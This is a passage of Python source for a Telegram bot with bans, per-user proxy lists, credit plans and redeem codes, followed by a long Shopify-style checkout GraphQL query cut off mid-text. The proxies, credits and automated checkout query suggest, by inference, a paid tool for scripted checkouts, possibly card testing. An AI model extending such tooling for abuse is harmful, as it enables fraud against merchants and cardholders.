    if is_banned(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('You are banned!')}", parse_mode="HTML")
        return
    
    proxies = get_user_proxies(user_id)
    if not proxies:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('No Proxies Found!')}", parse_mode="HTML")
        return
    
    delete_user_proxy(user_id)
    await update.message.reply_text(f"""{get_emoji_text('success')} {to_bold('All Proxies Deleted!')}

{get_emoji_text('delete')} {len(proxies)} proxy(s) removed.
{get_emoji_text('plus')} {to_bold('Use /add_proxy to add new ones.')}""", parse_mode="HTML")

def create_code(credits, creator_id):
    data = load_data()
    code = str(uuid.uuid4())[:8].upper()
    data["codes"][code] = {"credits": credits, "created_by": creator_id, "created_at": datetime.now().isoformat(), "used": False, "used_by": None}
    save_data(data)
    return code

def redeem_code(user_id, code):
    data = load_data()
    code = code.upper()
    if code in data["codes"] and not data["codes"][code]["used"]:
        credits = data["codes"][code]["credits"]
        data["codes"][code]["used"] = True
        data["codes"][code]["used_by"] = user_id
        uid = str(user_id)
        if uid in data["users"]:
            data["users"][uid]["credits"] += credits
            if data["users"][uid]["credits"] >= 1:
                data["users"][uid]["plan"] = "Premium"
        save_data(data)
        save_users_json()
        return credits
    return None

def make_admin(user_id):
    data = load_data()
    uid = str(user_id)
    if uid in data["users"]:
        data["users"][uid]["plan"] = "Admin"
        data["users"][uid]["credits"] = 999999
        save_data(data)
        save_users_json()

def remove_user_subscription(user_id):
    data = load_data()
    uid = str(user_id)
    if uid in data["users"]:
        data["users"][uid]["plan"] = "Free"
        data["users"][uid]["credits"] = 0
        data["users"][uid]["proxy"] = None
        data["users"][uid]["proxies"] = []
        save_data(data)
        save_users_json()
        return True
    return False

def get_premium_users():
    data = load_data()
    premium_users = []
    for uid, user in data["users"].items():
        if user["plan"] in ["Premium", "Admin", "Owner"]:
            premium_users.append({"user_id": int(uid), "username": user.get("username", "N/A"), "plan": user["plan"], "credits": user["credits"], "proxy": "✅" if user.get("proxy") or user.get("proxies") else "❌", "joined": user.get("joined", "N/A")})
    return premium_users

def get_user_stats(user_id):
    user = get_user(user_id)
    if user:
        proxy = user.get("proxy", None)
        proxies = user.get("proxies", [])
        proxy_status = "Set" if (proxy and proxy != "Not Set") or proxies else "Not Set"
        return {"plan": user["plan"], "credits": "∞" if user["plan"] in ["Owner", "Admin"] else user["credits"], "proxy": proxy_status}
    return {"plan": "Free", "credits": 0, "proxy": "Not Set"}

def check_user_subscription(user_id):
    return True

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId 